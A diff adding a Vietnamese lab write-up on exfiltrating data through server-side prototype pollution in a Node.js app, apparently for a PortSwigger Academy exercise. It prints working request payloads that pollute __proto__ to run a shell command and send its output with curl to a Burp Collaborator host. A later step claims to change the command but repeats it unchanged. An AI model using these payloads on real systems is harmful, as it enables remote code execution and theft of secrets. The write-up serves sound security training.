@@ -214,4 +214,22 @@ sau đó, click "Run maintainance jobs" (dự đoán website sẽ tạo subproce
 Request trên sẽ cấu hình các biến số cho subprocess bằng method `child_process.fork()`, khiến cho lệnh `require('fs')` và `fs.unlinkSync('/home/carlos/morale')` được thực hiện. Sau khi submit và click "Run maintainance jobs", bài lab được giải.
 
 # 10. Exfiltrating sensitive data via server-side prototype pollution
+Đăng nhập với credentials wiener:peter, ta thấy có các chức năng tương tự lab #9, và ta có thể detect lỗ hổng prototype pollution bằng cách tương tự.
 
+Trong chức năng thay đổi address, cấu hình request:
+```
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"JUURtveIt2PKjp9otNRvZ5sb9hlEwwq0","x":1,"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=6y5xldxdz9g834nbbaklw77fh6nxbm.oastify.com"}}
+```
+ta thấy Burp Collaborator hiển thị thông tin request đến, như vậy website có sử dụng `child_process` module để tạo subprocess. Tiếp đó, để thực thi RCE ta cấu hình request với body sau:
+```
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"PcyfX9WgZwrKRkHjAXg0dq3eOHX5OgM6","x":1,"__proto__":{"shell":"vim","input":":! ls|curl -X POST jsfafqrqtmalxhho5neyqk1sbjhf54.oastify.com -d @- \n"}}
+```
+Vào Burp Collaborator, ta thấy một POST request được gửi đến với phần body có content là `node_appssecret`
+
+![image](https://user-images.githubusercontent.com/103978452/228772028-da73927c-cfa0-4b09-a19d-bc9969bcafd2.png)
+
+Tiếp đó, ta thay đổi `"input":":! ls|curl -X POST jsfafqrqtmalxhho5neyqk1sbjhf54.oastify.com -d @- \n". Vào Burp Collaborator, ta thu được chuỗi secret đang tìm:
+
+![image](https://user-images.githubusercontent.com/103978452/228772320-aeda9fcd-10b2-4d37-bf07-198ba76b648b.png)
+
+Dùng thông tin thu được để Submit solution, kết quả bài lab được giải.
